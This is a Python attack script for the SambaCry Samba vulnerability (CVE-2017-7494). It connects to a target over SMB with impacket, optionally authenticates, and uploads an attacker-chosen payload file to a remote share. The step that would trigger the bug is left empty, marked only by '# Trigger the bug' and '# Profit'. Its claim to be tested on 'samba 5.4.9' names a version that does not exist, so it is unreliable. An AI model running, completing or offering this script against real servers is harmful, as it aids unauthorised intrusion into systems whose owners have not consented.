#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
    Sambacry (CVE-2017-7494) exploit by opsxcq
        github.com/opsxcq
        twitter.com/opsxcq

    Tested on samba 5.4.9
"""

from sys import argv, exit
from argparse import ArgumentParser
import os

from impacket.dcerpc.v5 import samr, transport, srvs
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import *


def exploit(target, port, executable, remoteshare, remotepath,  user=None, password=None):
    """Samba exploit"""

    # Open the connection
    smbClient = SMBConnection(target, target, sess_port=port)
    if user:
        if not smbClient.login(user,password):
            raise Exception("Authentication error, invalid user or password")
        else:
            print("[+] Authentication ok, we are in !")

    # Upload the payload module
    executableName = os.path.basename(executable)
    executableFile = open(executable, 'rb')

    smbClient.putFile(remoteshare, remotepath, executableFile.read)

    executableFile.close()
    # Trigger the bug

    # Profit


if __name__ == "__main__":
    ap = ArgumentParser(description="Sambacry (CVE-2017-7494) exploit by opsxcq")
    ap.add_argument("-t", "--target", required=True, help="Target's hostname")
    ap.add_argument("-e", "--executable", required=True, help="Executable/Payload file to use")
    ap.add_argument("-s", "--remoteshare", required=True, help="Executable/Payload shared folder to use")
    ap.add_argument("-r", "--remotepath", required=True, help="Executable/Payload path on remote file system")
    ap.add_argument("-u", "--user", required=False, help="Samba username (optional")
    ap.add_argument("-p", "--password", required=False, help="Samba password (optional)")

    args = vars(ap.parse_args())

    # TODO : Add domain name as an argument
    port = 445 # TODO : Add as an argument

    try:
        print("[*] Starting the exploit")
        exploit(args["target"], port, args["executable"], args["remoteshare"],args["remotepath"], args["user"], args["password"])
    except IOError:
        exit("[!] Error")
    except KeyboardInterrupt:
        print("\n[*] Aborting the  attack")
